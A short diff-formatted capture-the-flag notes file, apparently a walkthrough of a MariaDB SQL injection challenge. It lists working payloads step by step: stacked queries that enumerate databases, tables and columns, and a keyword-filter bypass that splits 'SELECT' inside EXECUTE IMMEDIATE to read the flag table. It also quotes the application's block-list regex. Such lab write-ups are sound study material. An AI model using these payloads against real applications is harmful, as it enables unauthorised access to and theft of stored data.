@@ -1,0 +1,30 @@
+* SQLi
+
+- payload: 1' 
+	-> error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
+
+- payload: 1' or 1=1 #
+ -> all record
+ 
+- payload: 1' union select null, null #
+ -> return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+ -> select is block
+ 
+* mariaDB have other statements:
+	https://mariadb.com/kb/en/show/
+
+- payload: 1'; show databases #
+	-> all databases
+	-> current databse: supersqli
+
+- payload: 1'; show tables #
+	-> tables of current database: 1919810931114514 and words
+
+- payload: 1'; show columns from `1919810931114514` from supersqli #
+	-> columns of table: 
+	
+* Use dynamic SQL to get content of table
+payload:
+ 1' ;EXECUTE IMMEDIATE CONCAT('SELE', 'CT flag FROM `1919810931114514`') #
+
+	-> got flag
